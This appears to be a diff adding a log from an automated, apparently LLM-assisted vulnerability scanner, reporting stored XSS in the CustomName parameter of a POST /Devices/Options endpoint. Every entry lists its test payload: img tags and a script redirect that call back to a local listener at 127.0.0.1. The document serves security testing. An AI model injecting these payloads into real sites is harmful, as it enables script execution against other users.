@@ -1,0 +1,39 @@
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /Devices/Options
+Vul API Method: Post
+API Vul Param: CustomName
+API Test Payload: <img src='http://127.0.0.1:4444/xss/Devices/OptionsLLMCustomName'>
+
+API Vul Type: xss
+Vul API Url: /Devices/Options
+Vul API Method: Post
+API Vul Param: CustomName
+API Test Payload: <img src='http://127.0.0.1:4444/xss/Devices/OptionsLLMCustomName'>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /Devices/Options
+Vul API Method: Post
+API Vul Param: CustomName
+API Test Payload: <img src='https://127.0.0.1:4445/xss/Devices/OptionsLLMCustomName'>
+
+API Vul Type: xss
+Vul API Url: /Devices/Options
+Vul API Method: Post
+API Vul Param: CustomName
+API Test Payload: <img src='https://127.0.0.1:4445/xss/Devices/OptionsLLMCustomName'>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /Devices/Options
+Vul API Method: Post
+API Vul Param: CustomName
+API Test Payload: <script>window.location='http://127.0.0.1:4444/xss/Devices/OptionsLLMCustomName'</script>
+
+API Vul Type: xss
+Vul API Url: /Devices/Options
+Vul API Method: Post
+API Vul Param: CustomName
+API Test Payload: <script>window.location='http://127.0.0.1:4444/xss/Devices/OptionsLLMCustomName'</script>
+
